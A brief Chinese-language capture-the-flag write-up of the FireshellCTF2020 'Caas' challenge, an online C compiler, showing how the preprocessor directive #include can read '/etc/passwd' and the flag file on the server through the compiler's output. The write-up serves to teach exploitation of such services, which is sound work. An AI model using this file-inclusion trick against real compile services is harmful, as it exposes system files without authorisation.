# [FireshellCTF2020]Caas c语言预编译的文件包含

打开网站

```less
Welcome guest! Please input your code below and we will compile it for you.
```

提示我们会进行编译

随意输入



<img src="https://i-blog.csdnimg.cn/blog_migrate/db5a53bb18423af8a496d44ad6a2d789.png" alt="" style="max-height:167px; box-sizing:content-box;" />


报错 这里我们查询一下 是c语言的编译

我们尝试输入正确的代码

```cpp
#include <stdio.h>
 
int main() {
    printf("Hello, World! \n");
    return 0;
}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/986a7257722f57361846695a4a81f745.png" alt="" style="max-height:161px; box-sizing:content-box;" />


发现返回了一个文件 执行是我们的代码 所以这里其实是c语言的编译器没错了

这里我们可以通过 #include 引入文件 然后进行包含

```cpp
#include "/etc/passwd"
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/77c4793a2356521df513cd65a9ed0e47.png" alt="" style="max-height:769px; box-sizing:content-box;" />


发现成功读取到了 这里我们直接读取flag

```cpp
#include "/flag"
```